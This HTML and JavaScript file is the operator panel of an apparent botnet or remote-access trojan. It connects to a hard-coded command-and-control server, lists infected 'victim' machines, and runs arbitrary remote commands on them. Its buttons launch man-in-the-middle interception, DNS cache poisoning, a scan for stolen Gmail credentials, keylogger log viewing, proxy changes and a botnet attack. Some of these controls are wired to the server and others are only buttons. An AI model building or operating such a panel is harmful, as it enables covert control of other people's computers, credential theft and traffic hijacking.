<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
  <script src='https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.3/socket.io.js'></script>.


  <script>

  

    var socket = io('http://13.126.74.47:8000');


  function generateUsersList(data) {
      data = JSON.parse(data);
    var str = '<table class="table">';
    str += "<tr><td>ID</td><td>Name</td><td>Type/Status</td>";
    for(var i = 0; i < data.length;i++) {
        if(data[i].type == 'dead' || data[i].type == 'acp') continue;
        str += "<tr><td>" + data[i].sockid + "</td><td>" + data[i].name + "</td><td>" + data[i].type + "</td>";
    }
    str += "</table>";
    return str;
  }

  function genUserSelect(data) {
      data = JSON.parse(data);
    var str = 'Select Client: </label><select id="victim">';
    for(var i = 0; i < data.length;i++) {
        if(data[i].type == 'dead' || data[i].type == 'acp') continue;
        str += "<option value='" + data[i].sockid + "'>" + data[i].name + "</option>";
    }
    str += "</select>";
    return str;
  }


  
  
      

  $(document).ready(function() {

      $("#runcmd").on('click', function() { 

          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: $("#cmdinput").val() }, function (data) {
              
                $("#cmd-op-body").html(data);
                $("#cmd-op").modal('show');
          });

          
      });

      $("#checkpass").on('click', function() { 
            $.get("filter.php", function(data, status){
                alert(data);
            });
          
      });

      $("#mitmdo").on('click', function() { 
            socket.emit('mitmproxy_client', { toclient: $("#victim").val() }, function (data) {
                console.log(data);
                alert("All Data is not being itercepted!");
            });
          
      });

      $("#poisondns").on('click', function() { 
            socket.emit('dnspoison_client', { toclient: $("#victim").val() }, function (data) {
                console.log(data);
                alert("DNS Poisoned!");
            });
      });
      
   });    
      
      
      
      
      
      
      
      
      
      
      
      
      

    socket.emit('client_connect', { name: 'admin', type: 'acp' }, function (data) {
        console.log("Connect ACK");
        socket.emit('list_clients', null, function (data) {
            console.log("Listing clients...");
            $("#clients").append(generateUsersList(data));

            $("#cselect").append(genUserSelect(data));

           

            


            
        });
    });


            

     </script>


</head>
<body>

  
<div class="container">

<nav class="navbar navbar-inverse navbar-fixed-top">
  <div class="container-fluid">
    <div class="navbar-header">
      <a class="navbar-brand" href="#">The_GRL Control Panel</a>
    </div>
    <ul class="nav navbar-nav">
      <li class="active"><a href="#">Control Panel</a></li>
    </ul>
  </div>
</nav>

    <br/><br/>

  <div class="row">
    <h2>Connected clients</h2>
    <div class="col-sm-12" id="clients">    </div>
  </div>

  <div class="row">
    <h2>Operations</h2>
    <div class="col-sm-12" id="cselect">    </div>
  </div>

  <div class="row">
      <h3>Remote Commands</h3>
    <div class="col-sm-12" id="operations">
        <input id="cmdinput" placeholder="Enter command"></input><button id="runcmd">Run</button> 
    </div>
  </div>

  <div class="row">
      <h3>Attacks</h3>
    <div class="col-sm-12" id="operations">
        <button id="mitmdo">Man In the Middle Attack</button><br/><br/>  
        <button id="checkpass">MITM - Scan for intercepted Gmail Cred.</button><br/><br/>  
        <button id="poisondns">Poison DNS Cache</button> <br/> <br/> 
    </div>
  </div>


<div class="row">
      <h3>Misc.</h3>
    <div class="col-sm-4" id="operations">
        <button id="screen">Screenshot</button> <br/> <br/> 
        <button id="keylogger">View Keylogger Logs</button> <br/> <br/> 
    </div>
    <div class="col-sm-8" id="operations">    

        <input id="ffip" placeholder="IP address"></input>
        <input id="ffport" placeholder="Port"></input>
        <button id="proxychange">Change Proxy Settings</button> <br/> <br/> 

        <input id="botnetip" placeholder="IP address"></input>
        <button id="botnet">Botnet Attack</button> <br/> <br/> 

        <input id="resolvedit" placeholder="Enter text.."></input>
        <button id="resolvview">View DNS Resolver Cache</button> <br/> <br/> 
        <button id="resolvedit">Edit DNS Resolver Cache</button> <br/> <br/> 

    </div>
    <div class="col-sm-0" id="operations">    </div>
  </div>



  <div class="modal fade" id="cmd-op" role="dialog">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Command Output</h4>
        </div>
        <div class="modal-body">
          <pre id="cmd-op-body"></pre>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>


</div>

</body>
</html>



